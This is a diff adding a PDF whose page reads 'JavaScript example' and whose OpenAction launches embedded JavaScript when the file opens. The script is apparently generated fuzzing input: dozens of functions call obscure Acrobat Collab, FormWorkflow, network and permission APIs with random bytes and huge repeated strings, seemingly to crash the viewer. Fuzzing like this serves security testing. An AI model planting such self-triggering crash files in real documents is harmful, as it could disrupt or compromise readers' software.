@@ -1,0 +1,489 @@
+%PDF-1.1
+
+1 0 obj
+<<
+ /Type /Catalog
+ /Outlines 2 0 R
+ /Pages 3 0 R
+ /OpenAction 7 0 R
+>>
+endobj
+
+2 0 obj
+<<
+ /Type /Outlines
+ /Count 0
+>>
+endobj
+
+3 0 obj
+<<
+ /Type /Pages
+ /Kids [4 0 R]
+ /Count 1
+>>
+endobj
+
+4 0 obj
+<<
+ /Type /Page
+ /Parent 3 0 R
+ /MediaBox [0 0 612 792]
+ /Contents 5 0 R
+ /Resources <<
+             /ProcSet [/PDF /Text]
+             /Font << /F1 6 0 R >>
+            >>
+>>
+endobj
+
+5 0 obj
+<< /Length 56 >>
+stream
+BT /F1 12 Tf 100 700 Td 15 TL (JavaScript example) Tj ET
+endstream
+endobj
+
+6 0 obj
+<<
+ /Type /Font
+ /Subtype /Type1
+ /Name /F1
+ /BaseFont /Helvetica
+ /Encoding /MacRomanEncoding
+>>
+endobj
+
+7 0 obj
+<<
+ /Type /Action
+ /S /JavaScript
+ /JS (try{spell.available}catch(e){};
+f0=function(){try{this.Collab.isDocCentreSignupDisabled()}catch(e){};try{this.Collab.isDocDirty({doc:[]})}catch(e){};try{this.Collab.updateMountInfo()}catch(e){};try{this.FormWorkflow.setFormWorkflowFolder({cCategory:Array(0x7abc).join("\\u6575"),cDocID:"\\u01ef\\ucdcb\\u0c17\\uc20d\\u6d1e\\uc460\\ub3e3\\u6eae\\u3adc\\u4fc7\\u7dfe\\u4c1f",cFolder:"\\x68\\x61\\x73\\xce\\x3e\\x3d\\xc6"})}catch(e){}}
+f1=function(){try{this.util.charToByte({cStr:"\\x60\\x70\\x4e\\x71\\x79\\x76\\x53\\x45"})}catch(e){};try{this.Collab.GetActiveDocIW()}catch(e){};try{this.createIcon({cStream:"\\x62\\xf9\\x32\\x93\\x55\\xf9\\x2e\\x4c",nWidth:4013.5381})}catch(e){};try{this.FormWorkflow.getFormWorkflowInfo({cFormWorkflowID:"\\xc1\\x54\\x14\\x3b\\x67\\xe0\\x37"})}catch(e){};try{this.Collab.getNumberOfReviewsOnServer({cServer:"\\x73\\x8e\\x41\\xdf\\x69\\x67\\xdb"})}catch(e){}}
+f2=function(){try{this.Collab.AVUMAddStringToPayloadWrapper({name:Array(0xa40).join("\\x72"),val:Array(0x892).join("\\x4e")})}catch(e){};try{this.Collab.unregisterApproval({doc:Array(0x5b2d).join("\\x58")})}catch(e){};try{this.Collab.addDocToDocsOpenedByWizard({cDocPath:"\\x48\\x75\\xf0\\x6f\\x9c\\x73"})}catch(e){}}
+f3=function(){try{this.app.fsTimeDelay=51845.4071}catch(e){};try{this.Collab.sync({cUser:"\\u0c6f\\u18ea\\u9199\\ua873",bUpdateStore:true})}catch(e){};try{this.Collab.unregisterReview({doc:Array(0x6b4).join("\\x4c")})}catch(e){};try{this.Collab.updateMountInfo()}catch(e){};try{this.app.isValidSaveLocation({cPath:"\\x62",cFS:Array(0xe35).join("\\x69")})}catch(e){}}
+f4=function(){try{this.Collab.setReviewFolderForMultipleReviews({cCategory:"\\x64\\x69\\x61\\x6d\\x6f\\x6e\\x64",oDocIDs:[],cFolder:"\\x46\\x54\\x4b\\x66\\x6b\\x10\\x56"})}catch(e){};try{this.app.setProfile()}catch(e){};try{this.Net.streamFromString({cString:"\\x59\\x48\\x28\\x39\\x59\\x59\\x78\\x7e"})}catch(e){};try{this.app.fsUsePageTiming=true}catch(e){};try{this.Net.Subscriptions.removeFeed({cURL:"\\x52\\x65\\x66\\x6c\\x6f\\x77\\x57\\x69\\x64\\x74\\x68"})}catch(e){}}
+f5=function(){try{this.app.fsTimeDelay=14.3}catch(e){};try{this.app.fsUsePageTiming=true}catch(e){};try{this.Collab.showAnnotToolsWhenNoCollab=true}catch(e){};try{this.Collab.getCustomServerLink({cServerType:"\\u65bc\\ub8a0"})}catch(e){};try{this.appRightsValidate({oSecHdlr:{},nValidateOption:14.41})}catch(e){}}
+f6=function(){try{this.addNewField({cName:"\\x74\\x76\\x76",cFieldType:"\\x5c\\x3c\\x4f\\x3d\\xee\\x70\\x5a\\xc5\\x38\\x5a\\x6e\\x76\\xaa",nPageNum:1380586524.8,oCoords:[36274.346,1.11,816264534.108565679,61153.460383262]})}catch(e){};try{this.Net.stringFromStream({oStream:{}})}catch(e){};try{this.Collab.getServiceURL({cURL:"\\u990e\\u93a6\\uad4a\\ub9a6\\u6559\\u278c\\uceaa\\uc8d8\\ud95a\\u9dbf"})}catch(e){};try{this.Collab.getReviewError({cReviewID:"\\ucc3c\\udb24\\ud722\\ufeba\\u3f05\\u9ff3\\u7882\\udad1"})}catch(e){};try{this.Collab.defaultStore="\\x5c\\x64\\x7b\\x30\\x2c\\x33\\x7d\\x5c\\x29\\x28\\x5c\\x2e\\x7c\\x5b\\x2d\\x20\\x5d\\x29\\x3f\\x5c\\x64\\x7b\\x30\\x2c\\x33\\x7d\\x28\\x5c\\x2e\\x7c\\x5b\\x2d\\x20\\x5d\\x29\\x3f\\x5c\\x64\\x7b\\x30\\x2c\\x34\\x7d"}catch(e){}}
+f7=function(){try{this.Collab.setStoreNoSettings({cName:"\\x46\\x61\\x78",bNoSettings:true})}catch(e){};try{this.getPrintSepsParams()}catch(e){};try{this.Collab.expandTrackerSelection()}catch(e){};try{this.Collab.setReviewFolderForMultipleReviews({cCategory:"\\u9e1f\\ud35a\\u8300\\u19a0\\uc70c\\u7b5a\\uc7f1",oDocIDs:[],cFolder:Array(0x7749).join("\\u618b")})}catch(e){};try{this.Collab.isOfflineReview({doc:[]})}catch(e){}}
+f8=function(){try{this.Collab.uriConvertReviewSource({cURL:"\\x41\\x87\\x5e"})}catch(e){};try{this.disableWindows()}catch(e){};try{this.Net.Subscriptions.update({})}catch(e){};try{this.FormWorkflow.setFormWorkflowFolder({cCategory:Array(0xe02).join("\\xbe"),cDocID:"\\u4da6\\uc10f\\u5436\\u6296\\u89e3\\ub64a",cFolder:"\\x58\\x73"})}catch(e){};try{this.Collab.setStoreSettings({cName:"\\x47\\x6c\\x69\\x74\\x74\\x65\\x72\\x52\\x69\\x67\\x68\\x74\\x55\\x70",cSettings:"\\uae7d\\u5fc6\\u813a\\udd6c\\ub507\\u9120"})}catch(e){}}
+f9=function(){try{this.Collab.removeApprovalDocScript({doc:[],scriptName:"\\x74\\x4d\\x73\\x66\\x6c\\xb6\\x74\\x90\\xb5\\x65\\x20\\x40\\x7c"})}catch(e){};try{this.shareIdentity.Authenticated=true}catch(e){};try{this.setUIPerms({cFeatureName:"",bFeatureValue:false})}catch(e){};try{this.Collab.isApprovalWorkflow({doc:{},bLax:false})}catch(e){}}
+f10=function(){try{this.tts.punctuations=Array(0xc27).join("\\xa1")}catch(e){};try{this.requestPermission({cType:Array(0x7cb).join("\\x94"),cOperation:Array(0x102d).join("\\ua9c1"),cExcludePermHandler:Array(0xffdd).join("\\x68")})}catch(e){};try{this.Collab.getReviewInfo({cReviewID:"\\u818e\\ub8e0\\ucf38\\uaeb4\\ub22e\\u5362\\u8380\\ue790"})}catch(e){};try{this.app.fsCursor=848366329.22035}catch(e){};try{this.Collab.setAlwaysUseServer({cURL:"\\x4d\\x24\\x48\\x65",cUIName:"\\x48\\x69\\x65\\x6c\\x45\\x4f\\x6e\\x6c\\x64\\x46",cReviewType:Array(0x1be6).join("\\u1567")})}catch(e){}}
+f11=function(){try{this.app.fsEscape=false}catch(e){};try{this.Collab.bringToFront({oDoc:"\\u9f3d\\ud85b\\u3930\\u1fcb"})}catch(e){};try{this.Collab.init({cUser:"\\x79\\x4c\\x5d\\x20\\x21\\x37\\xfd"})}catch(e){};try{this.Collab.AVUMAddStringToPayloadWrapper({name:"",val:Array(0xc28a).join("\\x55")})}catch(e){}}
+f12=function(){try{this.disableWindows()}catch(e){};try{this.Collab.hasReviewDeadline({cReviewID:"\\x48"})}catch(e){};try{this.Collab.canProxy({doc:this.shareIdentity})}catch(e){};try{this.Net.Subscriptions.getResourceContents({cURL:"\\u5890\\u9b4a\\ua6b3\\u4f64\\u4211\\uab9c"})}catch(e){};try{this.app.fsCursor=257.2}catch(e){}}
+f13=function(){try{this.Collab.getReviewFolders({cCategory:Array(0x7209).join("\\x32"),oDoc:false})}catch(e){};try{this.Collab.updateMountInfo()}catch(e){};try{this.Net.streamFromString({cString:Array(0x2563).join("\\ua1fb")})}catch(e){};try{this.app.isValidSaveLocation({cPath:"\\x6a",cFS:Array(0x10c).join("\\x89")})}catch(e){}}
+f14=function(){try{this.getUIPerms({cFeatureName:"\\x6d\\x4e\\x3e\\xd6\\x73\\x60"})}catch(e){};try{this.Collab.AVUMLogEventWrapper({cat:"\\ucaa4\\ubfae\\uaae0\\u0b02\\ue8fb\\u648e",subcat:Array(0x46d4).join("\\uead5"),evnt:"\\x3a\\x38\\x66\\xc3\\xce\\x11\\x4b\\x4b\\x34\\x78\\x61\\xca"})}catch(e){};try{this.Collab.showAnnotToolsWhenNoCollab=false}catch(e){};try{this.Collab.cosObj2Stream({obj:this.app.capabilities})}catch(e){};try{this.app.isValidSaveLocation({cPath:"\\x46\\x44\\x42",cFS:Array(0x9b2).join("\\x3d")})}catch(e){}}
+f15=function(){try{this.Collab.isFirstLaunch({cReviewType:"\\xc5\\x73\\x72\\x63\\xfe\\x50\\x53\\x63\\x49"})}catch(e){};try{this.Collab.isFirstLaunch({cReviewType:"\\x3e\\x4b\\x0c\\x27\\x47\\x0e\\x94\\xfc\\x7e\\xc2\\x7a\\x9a\\xeb\\x4b"})}catch(e){};try{this.info.ContactEmail="\\x49\\x6e\\x76\\x61\\x6c\\x69\\x64\\x20\\x76\\x61\\x6c\\x75\\x65\\x3a\\x20\\x6d\\x75\\x73\\x74\\x20\\x62\\x65\\x20\\x6c\\x65\\x73\\x73\\x20\\x74\\x68\\x61\\x6e\\x20\\x6f\\x72\\x20\\x65\\x71\\x75\\x61\\x6c\\x20\\x74\\x6f\\x20\\x25\\x73\\x2e"}catch(e){};try{this.Collab.addReviewFolder({cCategory:"\\x52\\x20\\xc7",cFolder:"\\x7c\\x84\\x34\\x52\\xe2\\x7c\\x7e"})}catch(e){};try{this.addNewField({cName:Array(0x7282).join("\\x0e"),cFieldType:"\\x4c\\x51\\x93\\x67\\xed",nPageNum:5.98,oCoords:[6.8491,1317070028.4531,810.3,93589888.3971]})}catch(e){}}
+f16=function(){try{this.Collab.getStoreSettings({cName:"\\x72\\x59"})}catch(e){};try{this.Collab.AVUMLogEventWrapper({cat:"\\ub170\\ua657\\u836f\\u4eef\\uae95\\uef73\\uac19\\u8cc1\\u60e7",subcat:"\\ucdd9",evnt:"\\x71\\x59\\x46\\x68\\x77\\x4e\\x79\\x40\\x54\\x67\\x49\\x6c\\x54"})}catch(e){};try{this.Collab.returnToInitiator({cReviewID:"\\x5b\\x2b\\x2d\\x5d\\x3f\\x5c\\x64\\x2b\\x5b\\x2e\\x2c\\x5d"})}catch(e){}}
+f17=function(){try{this.util.charToByte({cStr:Array(0x4d1e).join("\\u7715")})}catch(e){};try{this.Net.Subscriptions.addUI({cURL:Array(0x1fee).join("\\u6232"),oDriver:[]})}catch(e){};try{this.app.getString({cPlugInName:"\\u6358\\uc114\\ub654\\u518c\\ud513\\u4669\\udbcf\\u48b0\\u765e",cStringId:"\\u8a22\\u5ee6\\ucf7e\\u8322\\u555e\\uc859\\ue6c7\\ub83d\\u6d42\\u1379"})}catch(e){};try{this.Collab.uriConvertReviewSource({cURL:"\\x78\\xb2"})}catch(e){}}
+f18=function(){try{this.Collab.isInvalidSaveLocation({doc:[]})}catch(e){};try{this.createIcon({cStream:"\\x4d\\x53\\x55",nWidth:-8.6,nHeight:2.51})}catch(e){};try{this.RSS.getContents({cURL:Array(0x992).join("\\u5eaa")})}catch(e){};try{this.FormWorkflow.getFormWorkflowError({cWorkflowID:Array(0x3933).join("\\x6b")})}catch(e){};try{this.Collab.inEmailWorkflow=false}catch(e){}}
+f19=function(){try{this.RSS.update({cURL:"\\ufc6e\\uc120\\u7b5f\\ua7ce\\uef05\\u252a"})}catch(e){};try{this.Collab.isApprovalWorkflow({doc:[]})}catch(e){};try{this.app.fsLoop=false}catch(e){};try{this.Collab.lastBBRURL=Array(0x5ac5).join("\\x10")}catch(e){}}
+f20=function(){try{this.Collab.allReviewServers({cReviewType:"\\x62\\x67\\x7c"})}catch(e){};try{this.Collab.lastBBRURL=Array(0xc89).join("\\x73")}catch(e){};try{this.Collab.getReviewFolders({cCategory:"\\xc5\\xd5\\x73\\x53\\x5f\\x4a\\x38\\x2e",oDoc:-42505.1})}catch(e){}}
+f21=function(){try{this.app.fsUsePageTiming=false}catch(e){};try{this.Collab.init({cUser:Array(0x736c).join("\\x8d")})}catch(e){};try{this.Collab.createUniqueDocID()}catch(e){}}
+f22=function(){try{this.app.fsClick=false}catch(e){};try{this.appRightsValidate({oSecHdlr:[]})}catch(e){};try{this.Collab.getServiceURL({cURL:"\\x6d\\x67\\x5a\\x69\\x22\\x43"})}catch(e){};try{this.Collab.stream2CosObj({stream:this.XMLData})}catch(e){}}
+f23=function(){try{this.Collab.allReviewServers({cReviewType:"\\u1c6f\\u0458"})}catch(e){};try{this.wireframe=false}catch(e){};try{this.Collab.getFdfUrl({cURL:Array(0x75e).join("\\u96f8")})}catch(e){}}
+f24=function(){try{this.Collab.uriToDIPath({cURI:"\\u0dda\\u0cfc\\ua3a2\\u4be7\\ue7b8\\u9757",cIgnErr:true})}catch(e){};try{this.Collab.removeApprovalDocScript({doc:{},scriptName:Array(0xada).join("\\x51")})}catch(e){};try{this.Collab.getStoreFSBased({cName:"\\ud340\\uc057\\u98e7\\u0751\\ud307\\uca0a\\u5cb7"})}catch(e){};try{this.Collab.createAnnotStore({cName:"\\x6b\\x48\\x4b\\x74\\x54",doc:{},cSettings:"\\ufce5\\u9c62\\ueccb\\u4403\\u25d8\\u1c30\\u8d40"})}catch(e){}}
+f25=function(){try{this.Collab.isApprovalWorkflow({doc:[]})}catch(e){};try{this.app.mailMsgWithAttachment({bUI:true,cTo:Array(0x36fa).join("\\uac66"),cBcc:"\\x58\\x35\\x7d\\x65\\x4c\\x76\\xf6\\x70",cSubject:"\\u55f0\\ua43d\\ud968\\u9efc\\u80aa\\u2fc3\\u51e4\\ud138\\ub1c8\\u043a\\u9bc7\\u7eb2\\u7262\\ub4f2\\u9352\\ub7bf\\u9fe2",cMsg:"\\u67f0\\u5a3c\\u1a00\\u3775\\uaeee",cAttachment:"\\x78\\x72\\x59\\x77\\x6a\\x5c\\x43\\xd8\\x6e",cFS:"\\x53\\x5c\\x4c\\x08\\x76\\x66\\x4c\\x6d\\x22\\x64\\x23\\x8d"})}catch(e){};try{this.Collab.isFirstLaunch({cReviewType:Array(0xae78).join("\\x26")})}catch(e){};try{this.getNthIconName({nIndex:11.01})}catch(e){}}
+f26=function(){try{this.Collab.takeOwnershipOfComments()}catch(e){};try{this.Collab.endInitiatorMailOperation({doc:{}})}catch(e){};try{this.Collab.hasInitiatorEmailRequest({doc:[]})}catch(e){}}
+f27=function(){try{this.Collab.GetActiveDocIW()}catch(e){};try{this.Collab.AVUMAddStringToPayloadWrapper({name:"\\x70\\x6a\\x71\\x7a\\x78\\x28",val:""})}catch(e){};try{this.FormWorkflow.setFormFolderForMultipleForms({cCategory:Array(0xf03).join("\\ua895"),oDocIDs:[],cFolder:"\\x3f\\x52\\x65\\x6e"})}catch(e){};try{this.Collab.uriNormalize({cURI:"\\x59\\x23\\x66",bMock:false})}catch(e){}}
+f28=function(){try{this.util.byteToChar({nByte:1077.6972})}catch(e){};try{this.stampAPFromPage({cName:"\\x5c\\x28\\x5c\\x64\\x7b\\x33\\x7d\\x5c\\x29\\x28\\x5c\\x2e\\x7c\\x5b\\x2d\\x20\\x5d\\x29\\x3f\\x5c\\x64\\x7b\\x33\\x7d\\x28\\x5c\\x2e\\x7c\\x5b\\x2d\\x20\\x5d\\x29\\x3f\\x5c\\x64\\x7b\\x34\\x7d",doc:[],nPage:43705.51,matrix:{a:3145.98465,d:2428.11,v:41920.1},cLang:"\\x47\\x6c\\x69\\x74\\x74\\x65\\x72\\x4c\\x65\\x66\\x74\\x44\\x6f\\x77\\x6e",rect:{},bIncludeAnnots:true})}catch(e){};try{this.Collab.getReviewFolders({cCategory:Array(0x4ef).join("\\u49aa")})}catch(e){};try{this.Collab.getCCaddr({doc:{}})}catch(e){};try{this.Collab.getCustomServerLink({cServerType:Array(0xaf0).join("\\x41")})}catch(e){}}
+f29=function(){try{this.tts.punctuations=Array(0x6234).join("\\x64")}catch(e){};try{this.Collab.registerApproval({doc:{},initiator:Array(0xe34b).join("\\x63"),initScript:"\\u1a53\\uf964\\uf720\\u397c",invitees:Array(0x2547).join("\\x50"),cc:"\\u8f75\\uc3ed\\ude4e\\u1309\\u8d50\\u7832",sentDate:[],deadDate:{},ui:true,selfDestruct:true,initiatorEmail:true})}catch(e){};try{this.Collab.addAnnotStore({cName:"\\uf6c8\\ud142\\ua334\\u53f0\\u428e\\u8829\\u346c\\u7da4\\uf30b",cUIName:"\\uebd2\\ua0f7",factory:16277.4282,cSettings:Array(0x6b11).join("\\x53"),bHidden:false})}catch(e){};try{this.Collab.setReviewFolderForMultipleReviews({cCategory:"\\x73\\xe5",oDocIDs:[],cFolder:""})}catch(e){};try{this.Collab.updateMountInfo()}catch(e){}}
+f30=function(){try{this.view=[]}catch(e){};try{this.Collab.returnToInitiator({cReviewID:Array(0x1d63).join("\\u4619")})}catch(e){};try{this.Collab.beginInitiatorMailOperation({doc:[]})}catch(e){};try{this.RSS.addUI({cURL:"\\x56\\x6c\\x4d\\x72",oDriver:{}})}catch(e){};try{this.RSS.update({})}catch(e){}}
+f31=function(){try{this.Collab.addAnnotStore({cName:"",cUIName:"\\uec41\\u451b\\u8b0c\\ubde7\\u98b4",factory:Array(0x6fb).join("\\x25"),cSettings:"\\u8866\\ucc55\\u02eb\\u5059\\u82e0\\ufe15\\u2b6b",bHidden:true})}catch(e){};try{this.Collab.convertMappedDrivePathToSMBURL({cPath:Array(0xf3a).join("\\xf9")})}catch(e){};try{this.app.findComponent({cType:Array(0x2f8b).join("\\x6d"),cName:Array(0xc263).join("\\x5a"),cDesc:"\\x3a\\x48",cVer:"\\x3d\\x62",oParams:[],bSilent:false})}catch(e){}}
+f32=function(){try{this.Collab.setReviewRespondedDate({doc:{},date:-3312.6811})}catch(e){};try{this.Collab.getIcon({cIconName:"\\x8b\\x7e\\x27"})}catch(e){};try{this.Collab.getReviewFolders({cCategory:"\\x43\\x73\\x9a\\x75\\x64\\x59",oDoc:true})}catch(e){};try{this.Collab.unregisterReview({doc:Array(0xb64c).join("\\x37")})}catch(e){}}
+f33=function(){try{this.Collab.setReviewFolderForMultipleReviews({cCategory:Array(0xdab).join("\\x5c"),oDocIDs:[],cFolder:"\\x59\\x3c\\xd0\\x0f\\x4a\\x47\\x6c\\x40\\x58\\x3c\\xc1\\x65\\x44"})}catch(e){};try{this.Net.Subscriptions.update({cURL:Array(0x7da3).join("\\uc951")})}catch(e){};try{this.Collab.getFdfUrl({cURL:Array(0x3fdb).join("\\u6f00")})}catch(e){};try{this.Collab.unsetFirstLaunch({cReviewType:"\\uef8b"})}catch(e){};try{this.Collab.getReviewState({cReviewID:Array(0xf14d).join("\\xe2")})}catch(e){}}
+f34=function(){try{this.Collab.getStateModels({})}catch(e){};try{this.requestPermission({cType:Array(0xe8e9).join("\\x50"),cOperation:"",cExcludePermHandler:"\\x64"})}catch(e){};try{this.Collab.isInvalidSaveLocation({doc:[]})}catch(e){};try{this.Collab.expandTrackerSelection()}catch(e){};try{this.Collab.getServiceURL({cURL:Array(0x7bf4).join("\\u522c")})}catch(e){}}
+f35=function(){try{this.util.byteToChar({nByte:3.2292})}catch(e){};try{this.Collab.convertMappedDrivePathToSMBURL({cPath:Array(0xe5d).join("\\x5b")})}catch(e){};try{this.Net.Subscriptions.removeFeed({cURL:"\\u06a6\\uada6"})}catch(e){}}
+f36=function(){try{this.requestPermission({cType:"\\x43\\x6f\\x75\\x72\\x69\\x65\\x72",cOperation:"\\x47\\x6c\\x69\\x74\\x74\\x65\\x72\\x52\\x69\\x67\\x68\\x74"})}catch(e){};try{this.Net.wireDump=true}catch(e){};try{this.RSS.getResourceContents({cURL:"\\x57\\x69\\x70\\x65\\x52\\x69\\x67\\x68\\x74\\x55\\x70"})}catch(e){};try{this.Collab.isUbiquitized({doc:[]})}catch(e){}}
+f37=function(){try{this.Collab.registerReview({doc:[],initiator:"\\u9b5b\\ufc67\\ub46d\\u14fe\\uc78f",initScript:"\\x62\\x73\\x2c\\xd1\\x57",invitees:"\\x42\\x48\\x7c\\x69\\x45\\x3f\\x69\\x5b\\x3a\\x65\\x69\\x52\\x4f\\x76",bcc:"\\xbb\\x46\\x79\\x6d\\x43\\x14\\x73\\x43\\x39\\x56",sentDate:Array(0xfa20).join("\\x61"),ui:true,toolbars:"\\u38a1\\ua9b5\\ub371\\u6e21",selfDestruct:true,source:"\\x41",requireSave:true,distributionMethod:Array(0xc2a).join("\\x35"),versionInfo:4.01,accessLevel:-9.4173,bezelMessage:"\\x68\\x32\\x73\\x66\\x31\\x6a",displayWelcome:true})}catch(e){};try{this.Collab.AVUMLogEventWrapper({cat:"",subcat:"\\x2b\\x6d\\x5c\\x71\\xe1\\x42\\xe1\\x67\\xb2\\x77\\x00",evnt:"\\x2d\\x77\\x61\\x56\\x66\\xf6\\x4f\\x63\\x08\\x60\\x2c\\x79"})}catch(e){};try{this.Collab.getStoreSettings({cName:"\\x23\\x23\\x4d\\x4f\\x67\\x61\\x31\\x97\\x75\\x57"})}catch(e){};try{this.getUIPerms({cFeatureName:"\\ub340\\ud264"})}catch(e){};try{this.Collab.showBasicAuditTrail=false}catch(e){}}
+f38=function(){try{this.Collab.AVUMLogEventWrapper({cat:"\\x46\\x75\\x6c\\x6c",subcat:"\\x72\\x1d\\x63\\xe6\\x63\\xc6",evnt:"\\x59\\x08\\x48"})}catch(e){};try{this.Collab.setStoreSettings({cName:Array(0x2c52).join("\\x7a"),cSettings:Array(0x74c).join("\\x51")})}catch(e){};try{this.FormWorkflow.getNumberOfFormWorkflowsOnServer({cServer:"\\u124f\\u424b\\ue1ea\\u22bb\\u2a40\\u80fe\\u5d34\\u9d5f\\u89db"})}catch(e){};try{this.Collab.URL2PathFragment({cURL:"\\x12"})}catch(e){};try{this.Collab.getProgressInfo()}catch(e){}}
+f39=function(){try{this.FormWorkflow.setFormFolderForMultipleForms({cCategory:"\\x5a\\x52\\xc7\\x02\\x79\\x6f\\x39\\xe6\\x4d",oDocIDs:[],cFolder:"\\u64aa\\u77d1\\u0737\\ub0bf\\ue8ff\\ude45"})}catch(e){};try{this.Collab.unsetAlwaysUseServer({cReviewType:Array(0xfb3c).join("\\x6a")})}catch(e){};try{this.Collab.takeOwnershipAndPublishComments({cReviewID:"\\x21\\x6d"})}catch(e){}}
+f40=function(){try{this.addNewField({cName:"\\x57\\x44\\x75\\x64",cFieldType:Array(0xed4).join("\\x42"),nPageNum:2666.0943,oCoords:[3.8,2488.1,-33779.74392,-7.49665]})}catch(e){};try{this.addNewField({cName:Array(0x8a6).join("\\ub458"),cFieldType:"\\u54f6\\udf86\\u6b70\\u63e2\\u724f",nPageNum:9.060359093,oCoords:[7.10355,5.95803,1258.25432,3650.1]})}catch(e){};try{this.Collab.showBasicAuditTrail=false}catch(e){};try{this.Collab.getCustomEmailMessage({cDistMethod:Array(0x6f67).join("\\x6d"),cReviewType:"\\u39a4\\u6847\\ud903\\uf329",bAcrobatCom:true})}catch(e){}}
+f41=function(){try{this.Collab.maxPDFCommentsSize=2082315692.05492}catch(e){};try{this.Collab.removeReviewFolder({cCategory:"\\u47df\\u036e\\u3169\\u1c4c\\udb4b",cFolder:"\\x46\\x75\\x6c\\x6c"})}catch(e){};try{this.Collab.getIcon({cIconName:"\\x76\\x65"})}catch(e){};try{this.app.isValidSaveLocation({cPath:"\\ufc77\\ub150\\u50b9\\uf3e4\\ue5aa\\u35c7\\ua196\\udff0\\u5ca2\\uacbc\\u8324"})}catch(e){};try{this.Collab.enableFinalApprovalEmail({sendEmail:true})}catch(e){}}
+f42=function(){try{this.Collab.takeOwnershipAndPublishComments({cReviewID:Array(0x779).join("\\x49")})}catch(e){};try{this.Collab.isApprovalWorkflow({doc:[]})}catch(e){};try{this.Collab.bringToFront({oDoc:[]})}catch(e){};try{this.Collab.uriConvertReviewSource({cURL:""})}catch(e){}}
+f43=function(){try{this.shareIdentity.Authenticated=false}catch(e){};try{this.Collab.hasInitiatorEmailRequest({doc:[]})}catch(e){};try{this.RSS.addUI({cURL:Array(0xbcc3).join("\\x21"),oDriver:{}})}catch(e){};try{this.Collab.registerApproval({doc:{},initiator:"",bInitiating:false,initScript:"\\uea51\\uf45d\\ub726\\uc5cd\\ub281\\u2827",cc:"\\uae1e\\ue0ba\\u3819\\u172c\\ub92f\\uaaa7\\u9b2c\\u3b5b",sentDate:false,deadDate:-2129.706,ui:false,initiatorEmail:true})}catch(e){};try{this.Collab.getReviewInfo({cReviewID:Array(0x507).join("\\xa3")})}catch(e){}}
+f44=function(){try{this.RSS.addUI({cURL:Array(0xb2c8).join("\\x0f"),oDriver:[]})}catch(e){};try{this.app.fsTransition=Array(0x200).join("\\ueef5")}catch(e){};try{this.Collab.registerApproval({doc:{},initiator:"\\x5c\\x64\\x7b\\x33\\x7d\\x28\\x5c\\x2e\\x7c\\x5b\\x2d\\x20\\x5d\\x29\\x3f\\x5c\\x64\\x7b\\x32\\x7d\\x28\\x5c\\x2e\\x7c\\x5b\\x2d\\x20\\x5d\\x29\\x3f\\x5c\\x64\\x7b\\x34\\x7d",bInitiating:false,initScript:"\\x49\\x6e\\x76\\x61\\x6c\\x69\\x64\\x20\\x76\\x61\\x6c\\x75\\x65\\x3a\\x20\\x6d\\x75\\x73\\x74\\x20\\x62\\x65\\x20\\x67\\x72\\x65\\x61\\x74\\x65\\x72\\x20\\x74\\x68\\x61\\x6e\\x20\\x6f\\x72\\x20\\x65\\x71\\x75\\x61\\x6c\\x20\\x74\\x6f\\x20\\x25\\x73\\x2e",invitees:Array(0x2985).join("\\u3776"),cc:"\\x41\\x64\\x6f\\x62\\x65\\x2e\\x50\\x50\\x4b\\x4c\\x69\\x74\\x65",ui:false,selfDestruct:false,initiatorEmail:true})}catch(e){};try{this.spawnPageFromTemplate({cTemplate:"\\x6e\\x32\\xb1\\x68",bOverlay:true})}catch(e){}}
+f45=function(){try{this.Net.Subscriptions.addUI({cURL:"",oDriver:{}})}catch(e){};try{this.Collab.sync({cUser:Array(0x6d).join("\\ud8d4"),bUpdateDoc:false})}catch(e){};try{this.Collab.isDocReadOnly({cDocPath:Array(0x57a6).join("\\x52")})}catch(e){}}
+f46=function(){try{this.Collab.removeMultipleSelectedReviewsInTracker()}catch(e){};try{this.app.fsLoop=true}catch(e){};try{this.Collab.uriEncode({cURI:Array(0x439).join("\\x76")})}catch(e){};try{this.requestPermission({cType:"\\x57\\x69\\x70\\x65\\x52\\x69\\x67\\x68\\x74",cOperation:"\\x2a\\x33",cExcludePermHandler:Array(0x4831).join("\\u8221")})}catch(e){}}
+f47=function(){try{this.annotFilter=false}catch(e){};try{this.Collab.isInvalidSaveLocation({doc:[]})}catch(e){};try{this.Collab.isOfflineReview({doc:{}})}catch(e){}}
+f48=function(){try{this.Collab.removeReviewFolder({cCategory:Array(0x424e).join("\\x41"),cFolder:"\\xa8\\x7c\\x6c\\xd1"})}catch(e){};try{this.Collab.AVUMLogEventWrapper({cat:"\\x61\\x62\\x38\\x2b\\x66\\xa3",subcat:Array(0x51f7).join("\\x64"),evnt:"\\x67\\x65\\x71\\x44\\x77\\x26\\x66\\x59"})}catch(e){};try{this.app.findComponent({cType:"",cName:"\\xd2\\x57\\x5e\\x52\\xf9\\x68\\x6d\\xe1",cDesc:Array(0x4768).join("\\x65"),cVer:Array(0xbc6).join("\\xfd"),oParams:Array(0x55ad).join("\\x51"),bSilent:false})}catch(e){};try{this.app.fsLoop=false}catch(e){}}
+f49=function(){try{this.tts.punctuations="\\x46\\x69\\x74\\x50\\x61\\x67\\x65"}catch(e){};try{this.Collab.showAnnotToolsWhenNoCollab=false}catch(e){};try{this.Collab.isDocCenterURL({cURL:"\\x5b\\x2b\\x2d\\x5d\\x3f\\x5c\\x64\\x2a\\x2c\\x3f\\x5c\\x64\\x2a"})}catch(e){};try{this.Collab.AVUMEndPayloadWrapper()}catch(e){};try{this.app.fsUsePageTiming=false}catch(e){}}
+f50=function(){try{this.shareIdentity.Corporation="\\x52\\x47\\x42"}catch(e){};try{this.Net.Subscriptions.removeFeed({cURL:"\\x53\\x70\\x6c\\x69\\x74\\x48\\x6f\\x72\\x69\\x7a\\x6f\\x6e\\x74\\x61\\x6c\\x4f\\x75\\x74"})}catch(e){};try{this.createTemplate({cName:Array(0xe772).join("\\x03")})}catch(e){}}
+f51=function(){try{this.Collab.endInitiatorMailOperation({doc:{}})}catch(e){};try{this.Collab.disableDocCentreSignup()}catch(e){};try{this.createTemplate({cName:"\\x56\\x61\\x98\\x4b",nPage:906.8})}catch(e){};try{this.appRightsValidate({oSecHdlr:{},nValidateOption:3.3323})}catch(e){};try{this.createTemplate({cName:"\\u57b3\\u3c41\\u9adb",nPage:3095.4})}catch(e){}}
+f52=function(){try{this.Collab.getCustomEmailMessage({cDistMethod:Array(0x245).join("\\xc5"),cReviewType:Array(0xcf12).join("\\x42"),bAcrobatCom:false})}catch(e){};try{this.Collab.getAlwaysUseServer({cReviewType:"\\x7a\\xa9"})}catch(e){};try{this.RSS.getContents({cURL:"\\x46\\x6f\\x78\\x69\\x74"})}catch(e){}}
